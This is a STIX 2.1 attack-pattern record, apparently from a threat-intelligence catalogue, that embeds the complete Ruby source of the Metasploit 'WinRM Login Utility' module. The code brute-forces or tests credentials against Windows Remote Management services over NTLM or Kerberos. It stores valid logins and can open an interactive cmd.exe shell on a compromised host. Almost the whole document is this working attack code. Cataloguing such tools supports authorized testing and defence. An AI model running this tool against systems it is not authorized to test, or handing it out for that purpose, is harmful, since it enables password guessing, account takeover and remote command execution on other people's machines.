{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bada84dd-93f1-439a-a109-28d0f145da6e",
    "created": "2024-08-14T16:27:09.5814Z",
    "modified": "2024-08-14T16:27:09.581403Z",
    "name": "WinRM Login Utility",
    "description": " This module attempts to authenticate to a WinRM service. It currently works only if the remote end allows Negotiate(NTLM) authentication. Kerberos is not currently supported.  Please note: in order to use this module without SSL, the 'AllowUnencrypted' winrm option must be set. Otherwise adjust the port and set the SSL options in the module as appropriate. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/winrm/winrm_login.rb",
            "external_id": "winrm_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner'\nrequire 'metasploit/framework/login_scanner/winrm'\nrequire 'net/winrm/connection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WinRM\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::Kerberos::Ticket::Storage\n\n  def initialize\n    super(\n      'Name' => 'WinRM Login Utility',\n      'Description' => %q{\n        This module attempts to authenticate to a WinRM service. It currently\n        works only if the remote end allows Negotiate(NTLM) authentication.\n        Kerberos is not currently supported.  Please note: in order to use this\n        module without SSL, the 'AllowUnencrypted' winrm option must be set.\n        Otherwise adjust the port and set the SSL options in the module as appropriate.\n      },\n      'Author' => [ 'thelightcosine', 'smashery' ],\n      'References' => [\n        [ 'CVE', '1999-0502'] # Weak password\n      ],\n      'License' => MSF_LICENSE\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run\n    check_winrm_parameters\n    super\n  end\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n      realm: datastore['DOMAIN'],\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    kerberos_authenticator_factory = nil\n    if datastore['Winrm::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS\n      kerberos_authenticator_factory = -> (username, password, realm) do\n        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::HTTP.new(\n          host: datastore['DomainControllerRhost'],\n          hostname: datastore['Winrm::Rhostname'],\n          proxies: datastore['Proxies'],\n          realm: realm,\n          username: username,\n          password: password,\n          timeout: 20,\n          framework: framework,\n          framework_module: self,\n          cache_file: datastore['Winrm::Krb5Ccname'].blank? ? nil : datastore['Winrm::Krb5Ccname'],\n          mutual_auth: true,\n          use_gss_checksum: true,\n          ticket_storage: kerberos_ticket_storage,\n          offered_etypes: Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['Winrm::KrbOfferedEncryptionTypes'])\n        )\n      end\n    end\n\n    keep_connection_alive = datastore['CreateSession']\n\n    scanner = Metasploit::Framework::LoginScanner::WinRM.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['Proxies'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: 10,\n      framework: framework,\n      framework_module: self,\n      kerberos_authenticator_factory: kerberos_authenticator_factory,\n      keep_connection_alive: keep_connection_alive\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n        if datastore['CreateSession']\n          http_client = result.connection\n          rhost = result.host\n          rport = result.port\n          uri = datastore['URI']\n          schema = result.service_name\n          ssl = schema == 'https' # Can't trust the datastore value, because the scanner does some *magic* to set it for us\n          endpoint = \"#{schema}://#{rhost}:#{rport}#{uri}\"\n          conn = Net::MsfWinRM::RexWinRMConnection.new(\n            {\n              endpoint: endpoint,\n              host: rhost,\n              port: rport,\n              proxies: datastore['Proxies'],\n              uri: uri,\n              ssl: ssl,\n              user: result.credential.public,\n              password: result.credential.private,\n              transport: :rexhttp,\n              no_ssl_peer_verification: true,\n              operation_timeout: 1, # For the WinRM server\n              timeout: 20, # For the underlying HTTP client\n              retry_delay: 1,\n              realm: result.credential.realm,\n              http_client: http_client\n            }\n          )\n          shell = conn.shell(:stdin, {})\n          session_setup(shell, rhost, rport, endpoint)\n        end\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n  end\n\n  def session_setup(shell, _rhost, _rport, _endpoint)\n    # We use cmd rather than powershell because powershell v3 on 2012 (and maybe earlier)\n    # do not seem to pass us stdout/stderr.\n    interactive_process_id = shell.send_command('cmd.exe')\n    sess = Msf::Sessions::WinrmCommandShell.new(shell, interactive_process_id)\n    sess.platform = 'windows'\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    info = \"WinRM #{username}:#{password} (#{shell.owner})\"\n    merge_me = {\n      'USERNAME' => username,\n      'PASSWORD' => password\n    }\n\n    start_session(self, info, merge_me, false, nil, sess)\n  end\n\n  def start_session(obj, info, ds_merge, _crlf = false, _sock = nil, sess = nil)\n    sess.set_from_exploit(obj)\n    sess.info = info\n\n    # Clean up the stored data\n    sess.exploit_datastore.merge!(ds_merge)\n\n    framework.sessions.register(sess)\n    sess.process_autoruns(datastore)\n\n    # Notify the framework that we have a new session opening up...\n    # Don't let errant event handlers kill our session\n    begin\n      framework.events.on_session_open(sess)\n    rescue ::Exception => e\n      wlog(\"Exception in on_session_open event handler: #{e.class}: #{e}\")\n      wlog(\"Call Stack\\n#{e.backtrace.join(\"\\n\")}\")\n    end\n\n    sess\n  end\n\n  def test_request\n    return winrm_wql_msg('Select Name,Status from Win32_Service')\n  end\nend\n"
}